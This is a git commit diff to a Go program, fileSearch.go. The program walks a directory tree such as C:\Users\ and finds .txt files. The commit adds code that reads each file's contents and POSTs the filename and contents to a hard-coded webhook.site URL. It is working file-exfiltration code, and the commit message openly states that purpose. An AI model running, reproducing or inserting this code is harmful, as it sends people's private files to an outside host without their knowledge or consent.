09db376dba8735e2dbf62078c4da1e438f5c1b95
funSoftwareProjects <33334857+funSoftwareProjects@users.noreply.github.com>
2022-05-04 13:51:59 -0600

    Will post file contents, filenames to http site

--- fileSearch.go
+++ fileSearch.go
@@ -1,8 +1,10 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"log"
+	"net/http"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -12,18 +14,7 @@ import (
 //Windows usage: .\fileSearch.exe C:\Users\
 
 var regexes = []*regexp.Regexp{
-	regexp.MustCompile(`\.go$`), //how it decides to pick files should be improved, which regexp option to use?
-}
-
-func walkFn(path string, f os.FileInfo, err error) error {
-
-	for _, r := range regexes {
-		if r.MatchString(path) {
-			fmt.Printf("%s\n", path)
-
-		}
-	}
-	return nil
+	regexp.MustCompile(`\.txt$`), //how it decides to pick files should be improved, which regexp option to use?
 }
 
 func main() {
@@ -32,4 +23,44 @@ func main() {
 	if err := filepath.Walk(root, walkFn); err != nil {
 		log.Panicln(err)
 	}
+
+}
+
+func walkFn(path string, f os.FileInfo, err error) error {
+	for _, r := range regexes {
+		if r.MatchString(path) {
+			fmt.Printf("%s\n", path)
+			readAFile(path)
+
+		}
+	}
+	return nil
+}
+
+//Source: https://gobyexample.com/reading-files
+func readAFile(path string) {
+	dat, err := os.ReadFile(path)
+	if err != nil {
+		panic(err)
+	}
+	fmt.Print(string(dat))
+	httpPoster(string(dat), path)
+
+}
+
+func httpPoster(fileData string, filename string) {
+	data := []byte(filename + ":" + fileData)
+
+	req, err := http.NewRequest("POST", "https://webhook.site/27227c6f-b632-4b50-ae7e-a38b18629b2c", bytes.NewBuffer(data))
+	req.Header.Set("Content-Type", "application/json")
+	client := &http.Client{}
+
+	resp, err := client.Do(req)
+
+	if err != nil {
+		panic(err)
+	}
+
+	defer resp.Body.Close()
+
 }
